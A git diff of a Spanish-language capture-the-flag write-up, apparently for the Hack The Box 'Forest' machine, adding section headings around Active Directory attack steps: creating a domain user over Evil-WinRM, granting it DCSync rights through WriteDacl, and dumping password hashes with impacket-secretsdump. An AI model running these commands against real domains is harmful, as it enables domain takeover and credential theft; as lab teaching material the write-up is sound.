@@ -297,6 +297,8 @@ Info: Establishing connection to remote endpoint
 
 > Vemos que el grupo EXCHANGE WINDOWS PERMISSIONS tiene el permiso WriteDacl sobre el dominio. Esto lo podemos aprovechar dando al usuario los DCSync privileges, lo cual nos permitirá hacer un DCSync attack.
 
+- Abusing Account Operators Group 
+
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user /add /domain pwnd pwnd123
 ```
@@ -314,6 +316,8 @@ The command completed successfully.
 ```
 
 > Creamos un nuevo usuario y lo metemos en el grupo Exchange Windows Permissions. En este punto el nuevo usuario tiene los permisos WriteDacl sobre el dominio.
+
+- Abusing WriteDacl in the domain - Granting DCSync Privileges
 
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'pwnd123' -AsPlainText -Force
@@ -334,8 +338,13 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] DACL modified successfully!
 ```
 
+- DCSync Exploitation - impacket-secretsdump
+
 ```bash
 ❯ impacket-secretsdump htb.local/pwnd@10.10.10.161
+```
+
+```ruby
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 Password:
